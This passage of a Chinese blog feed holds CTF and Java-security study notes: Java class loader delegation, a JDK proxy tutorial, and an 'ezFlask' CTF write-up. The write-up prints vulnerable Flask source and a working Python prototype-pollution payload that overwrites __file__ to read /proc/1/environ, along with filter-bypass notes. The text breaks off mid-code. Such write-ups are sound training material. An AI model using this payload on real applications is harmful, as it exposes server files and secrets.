<strong>继承链自顶向下</strong>，先向上交再向下找</p><ol><li>当AppClassLoader加载一个class时，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器ExtClassLoader去完成。</li><li>当ExtClassLoader加载一个class时，它首先也不会自己去尝试加载这个类，而是把类加载请求委派给BootStrapClassLoader去完成。</li><li>如果BootStrapClassLoader加载失败(例如在$JAVA_HOME&#x2F;jre&#x2F;lib里未查找到该class)，会使用ExtClassLoader来尝试加载；</li><li>若ExtClassLoader也加载失败，则会使用AppClassLoader来加载</li><li>如果AppClassLoader也加载失败，则会报出异常ClassNotFoundException。</li></ol></li><li><p><strong>目的</strong>：系统类防止内存中出现多份同样的字节码</p><ol><li>Q: 那是怎么做到的呢？结合jvm的类加载隔离进行理解<ol><li>A: 例子：比如我们编写一个称为 java.lang.Object 类的话，那么程序运行的时候，系统就会出现两个不同的 Object 类。双亲委派模型可以保证加载的是 JRE 里的那个 Object 类，而不是你写的 Object 类。这是因为 AppClassLoader 在加载你的 Object 类时，会委托给 ExtClassLoader 去加载，而 ExtClassLoader 又会委托给 BootstrapClassLoader，BootstrapClassLoader 发现自己已经加载过了 Object 类，会直接返回，不会去加载你写的 Object 类</li></ol></li></ol></li></ol><h2 id="类的加载隔离"><a href="#类的加载隔离" class="headerlink" title="类的加载隔离"></a>类的加载隔离</h2><h3 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h3><blockquote><p>Q: JVM如何判定两个Java类是否相同的?<br>A: JVM不仅要看类的<em><strong>全名</strong></em>是否相同，还要看<em><strong>加载此类的类加载器</strong></em>是否一样。只有两者都相同的情况，才认为两个类是相同的。即使两个类来源于同一个 Class 文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相同</p></blockquote><ol><li>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。<ol><li>jvm类隔离机制<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/jvm%E7%B1%BB%E9%9A%94%E7%A6%BB%E6%9C%BA%E5%88%B6.png" alt="jvm类隔离机制"></li></ol></li><li><em><strong>基本原则</strong></em>: 跨类加载器调用类方法时需要特别注意一个基本原则：ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射</li></ol><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><ol><li>RASP和IAST经常会用到跨类加载器加载类的情况，因为RASP&#x2F;IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP&#x2F;IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>javasec</li><li><a href="https://javaguide.cn/java/jvm/classloader.html">java guide</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全2_jdk代理</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A82_jdk%E4%BB%A3%E7%90%86/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A82_jdk%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><blockquote><p><strong>java中代理的作用</strong>: 在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能<br>其实可以类似理解为python中装饰器，但是java是针对某一个类的全体对象的</p></blockquote><h2 id="先说Java静态代理"><a href="#先说Java静态代理" class="headerlink" title="先说Java静态代理"></a>先说Java静态代理</h2><ol><li>要求: 静态代理中，我们对目标对象的每个方法的增强都是手动完成的（后面会具体演示代码）</li><li><strong>局限性</strong>: 非常不灵活（比如接口一旦新增加方法，目标对象和代理对象都要进行修改）且麻烦（需要对每个目标类都单独写一个代理类） –&gt; <strong>从 JVM 层面来说， 静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件</strong></li><li>实现步骤<ol><li>静态代理实现步骤:定义一个接口及其实现类；</li><li>创建一个代理类同样实现这个接口<strong>将目标对象注入进代理类</strong>，然后在代理类的对应方法调用目标类中的对应方法。</li><li>这样的话，我们就可以通过代理类屏蔽对目标对象的访问，并且可以在目标方法执行前后做一些自己想做的事情。</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Main.java</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsService</span>();</span><br><span class="line">        <span class="type">ProxySmsService</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxySmsService</span>(smsService);</span><br><span class="line">        smsProxy.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ISmsService</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ISmsService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SmsService</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsService</span> <span class="keyword">implements</span> <span class="title class_">ISmsService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello SmsServie&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProxySmsService</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxySmsService</span> <span class="keyword">implements</span> <span class="title class_">ISmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService proxyedObj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxySmsService</span><span class="params">(SmsService obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.proxyedObj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello ProxySmsService&quot;</span>);</span><br><span class="line">        proxyedObj.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="再说jdk动态代理"><a href="#再说jdk动态代理" class="headerlink" title="再说jdk动态代理"></a>再说jdk动态代理</h2><h3 id="使用机制与步骤"><a href="#使用机制与步骤" class="headerlink" title="使用机制与步骤"></a>使用机制与步骤</h3><ol><li>步骤<ol><li>定义一个接口及其实现类；</li><li>自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li><li>通过 Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 方法创建代理对象；</li><li>接下来通过代理对象就可以调用经过增强的方法</li></ol></li><li>理解<ol><li>Proxy类用来创建动态代理</li><li>InvocationHandler用来处理函数调用 -&gt; <strong>。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用</strong></li></ol></li><li><strong>Proxy</strong><ol><li><p>关键方法</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                          InvocationHandler h)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须需要实现InvocationHandler 来自定义处理逻辑</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 当你使用代理对象调用方法的时候实际会调用到这个方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="动态代理实现示例"><a href="#动态代理实现示例" class="headerlink" title="动态代理实现示例"></a>动态代理实现示例</h3><ol><li>注意事项<ol><li><p>动态代理和静态代理一样是以<strong>对象为单位的</strong></p><ol><li>对象注入，但是没有限制哪种类型的对象可以注入，就都可以</li><li>但是<code>invoke()</code>中对不同对象的方法调用处理并不是对所有类型的对象都可以的</li></ol></li><li><p><em><strong>关于<code>Proxy.newInstance</code>的参数</strong></em></p><ol><li>lassLoader loader:描述: 类加载器。这个参数指定了用来加载代理类的类加载器 –&gt; 一般是加载接口类的加载器</li><li>Class&lt;?&gt;[] interfaces:描述: 代理类需要实现的接口数组</li><li><code>target.getClass().getClassLoader()</code>和<code>target.getClass().getInterfaces()</code>，也是利用到了反射</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个通用的调用方法，这里虽然使用了工厂模式，但是不是该模式也可以</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// 目标类的类加载器</span></span><br><span class="line">                target.getClass().getInterfaces(),  <span class="comment">// 代理需要实现的接口，可指定多个</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// 代理对象对应的自定义 InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工厂模式下的实际使用</span></span><br><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>在<code>invoke()</code>函数中，可以通过<strong>反射来对调用的不同函数进行处理</strong></p></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ITest</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ITest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Test</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">ITest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello Test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TestInvocationHandler</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 实现对象注入</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object myObj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInvocationHandler</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myObj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;test&quot;</span>))  &#123;</span><br><span class="line">            <span class="comment">// 调用前添加自己的操作</span></span><br><span class="line">            System.out.println(<span class="string">&quot;welcome to invoke&quot;</span>);</span><br><span class="line">            method.invoke(<span class="built_in">this</span>.myObj, args);</span><br><span class="line">            <span class="comment">// 调用后调用自己的操作</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Main</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ITest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        <span class="type">ITest</span> <span class="variable">myObj</span> <span class="operator">=</span> (ITest) Proxy.newProxyInstance(ITest.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ITest.class&#125;, <span class="keyword">new</span> <span class="title class_">TestInvocationHandler</span>(test));</span><br><span class="line">        myObj.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jdk动态代理局限性"><a href="#jdk动态代理局限性" class="headerlink" title="jdk动态代理局限性"></a>jdk动态代理局限性</h3><ol><li>比如它只能代理实现了接口的类。如果需要代理没有接口的类，则需要使用像 CGLIB 这样的第三方库</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://javaguide.cn/java/basis/proxy.html#_3-1-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6">javaguide</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezFlask_DASCTF23</title>
      <link href="/2024/11/12/ezFlask_DASCTF23/"/>
      <url>/2024/11/12/ezFlask_DASCTF23/</url>
      
        <content type="html"><![CDATA[<h2 id="分析-DONE"><a href="#分析-DONE" class="headerlink" title="分析(DONE)"></a>分析(DONE)</h2><ol><li><p>源码</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure></li><li><p>原型链污染，in似乎无法递归判断，密码存在内存中，没有admin –&gt; <strong>实际中in是由递归判断的</strong></p></li><li><p>目的和注入点是open那里，难道可以命令执行吗在这里，看不到触发点啊，先从open出发，毕竟明显</p></li><li><p>那么可以覆盖<code>__file__</code>然后读取flag文件？这里<code>__file__</code>可以通过全局变量直接覆写，就是本模块的命名空间中的内容</p></li><li><p>payload</p><ol><li>可以测出来是过滤了<code>__init__</code>，其他都保留了</li><li>没有找到flag文件，读取环境变量</li><li><code>/proc/1/environ</code>和<code>/proc/self/environ</code>中都读，是前一个个</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;__class__&quot;</span>:&#123;<span class="string">&quot;check&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;,<span class="string">&quot;11tadbx0ae9b&quot;</span>:<span class="string">&quot;=&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><ol><li><p>常见环境变量</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境变量是以空字符（\0）分隔的字符串形式存储的，只读的，不能修改</span></span><br><span class="line">/proc/<span class="number">1</span>/environ </span><br><span class="line">    <span class="comment"># init 进程的 PID 为 1，它在系统启动时由内核启动，并且在整个系统运行期间一直存在</span></span><br><span class="line">    <span class="comment"># 包含了 init 进程的环境变量</span></span><br><span class="line">/proc/<span class="variable 